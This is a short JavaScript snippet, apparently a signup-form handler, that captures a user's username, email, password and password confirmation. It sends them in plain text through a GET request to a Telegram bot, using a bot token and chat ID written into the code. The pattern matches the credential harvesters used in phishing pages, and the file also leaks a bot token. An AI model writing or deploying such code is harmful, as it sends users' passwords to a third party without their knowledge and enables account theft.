/* START SEND MESSAGE IN TELEGRAM BOT */
const form = document.getElementById("form");
form.addEventListener("submit", (e) => {
  e.preventDefault();

  let userName = document.getElementById("username").value;
  let email = document.getElementById("email").value;
  let pass = document.getElementById("pass").value;
  let confirmPass = document.getElementById("confirm-pass").value;

  let my_text = `Result is:%0A - userNmae: ${userName} %0A - email: ${email} %0A - pass: ${pass} %0A - confirmPass: ${confirmPass}`;

  let token = "6185876376:AAGOhCPpur1KnfBxqDxOeyzICQWV1F9FR10";
  var chat_id = -1001915309374;
  let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;

  fetch(url).then((res) => {
    return res.json;
  });
});
/* END SEND MESSAGE IN TELEGRAM BOT */
